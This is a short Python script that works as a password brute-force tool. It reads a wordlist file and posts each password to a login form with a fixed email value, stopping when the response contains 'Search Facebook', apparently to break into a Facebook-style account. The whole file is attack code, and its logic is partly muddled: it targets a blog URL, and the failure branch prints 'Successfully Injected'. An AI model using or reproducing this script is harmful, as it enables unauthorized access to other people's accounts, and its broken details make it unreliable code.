import requests

url = 'https://goheadar.blogspot.com/'
arq = open ('password.txt', 'r').readlines()

for line in arq:
	password = line.strip()
	https = requests.post(url, data = {'email':'Anonymous Philippine Hacker','pass':password , 'login':'submit'})
	content = https.content
	if "Search Facebook" in content:
		print("============== PASSWORD IS:" +password+"==============")
		break
	else:
		print("[-]Successfully Injected:")
